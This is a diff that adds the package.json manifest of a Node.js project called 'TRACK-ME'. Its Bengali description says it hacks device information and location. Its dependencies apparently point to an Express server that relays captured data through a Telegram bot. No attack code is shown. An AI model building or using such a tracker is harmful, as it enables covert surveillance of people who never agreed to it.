@@ -1,1 +1,26 @@
 
+{
+  "name": "TRACK-ME",
+    "version": "1.0.0",
+      "description": "Track ME ডিভাইস এর ইনফো ও লোকেশন হ্যাক করে থাকে ",
+        "main": "main.js",
+          "scripts": {
+              "test": "echo \"Error: no test specified\" && exit 1",
+                  "start": "node main.js"
+                     },
+                       "keywords": [],
+                         "author": {
+                            "name" : "AB1R AHMED",
+                               "url" : "https://github.com/abirahmed20"
+                                 },
+                                   "license": "MIT",
+                                     "dependencies": {
+                                         "base64-to-image": "^1.0.2",
+                                             "body-parser": "^1.20.1",
+                                                 "ejs": "^3.1.8",
+                                                     "cors": "^2.8.5",
+                                                         "express": "^4.18.2",
+                                                             "node-fetch": "^2.2.6",
+                                                                 "node-telegram-bot-api": "^0.60.0"
+                                                                   }
+                                                                   }
